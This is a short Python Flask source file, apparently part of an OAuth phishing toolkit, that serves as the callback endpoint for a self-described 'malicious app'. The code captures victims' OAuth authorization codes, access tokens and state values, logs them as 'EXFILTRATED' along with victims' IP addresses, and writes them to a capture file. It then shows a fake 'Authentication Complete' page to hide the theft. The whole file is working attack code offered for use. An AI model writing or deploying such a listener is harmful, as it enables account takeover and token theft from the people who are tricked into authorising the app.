"""OAuth code/token capture listener (redirect endpoint for the malicious app)."""
from flask import Flask, request, jsonify
import logging
from datetime import datetime

from .constants import CAPTURE_FILE, DATA_DIR

app = Flask(__name__)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f"{DATA_DIR}/capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
        logging.StreamHandler()
    ]
)

@app.route('/oauth/callback', methods=['GET', 'POST'])
def capture_tokens():
    logging.info("=== INCOMING REQUEST ===")
    logging.info(f"Method: {request.method}")
    logging.info(f"Full URL: {request.url}")
    logging.info(f"Query params: {dict(request.args)}")

    # Common OAuth artifact names
    code = request.args.get('code')
    token = request.args.get('access_token')
    state = request.args.get('state')

    if code:
        logging.info(f"[!] EXFILTRATED CODE: {code[:100]}...")
        with open(CAPTURE_FILE, 'a') as f:
            f.write(f"{datetime.now()} | {request.remote_addr} | CODE: {code}\n")
    if token:
        logging.info(f"[!] EXFILTRATED TOKEN: {token[:100]}...")
        with open(CAPTURE_FILE, 'a') as f:
            f.write(f"{datetime.now()} | {request.remote_addr} | TOKEN: {token}\n")
    if state:
        logging.info(f"[!] STATE: {state}")
        with open(CAPTURE_FILE, 'a') as f:
            f.write(f"{datetime.now()} | {request.remote_addr} | STATE: {state}\n")

    # Return a convincing page
    return """
    <html>
        <body>
            <h2>Authentication Complete</h2>
            <p>You have been successfully authenticated. You may close this window.</p>
            <script>window.close();</script>
        </body>
    </html>
    """, 200

@app.route('/ping', methods=['GET'])
def ping():
    return "listener ready", 200

if __name__ == '__main__':
    # For local testing only — use gunicorn + nginx for production
    app.run(host='0.0.0.0', port=8080, debug=False)
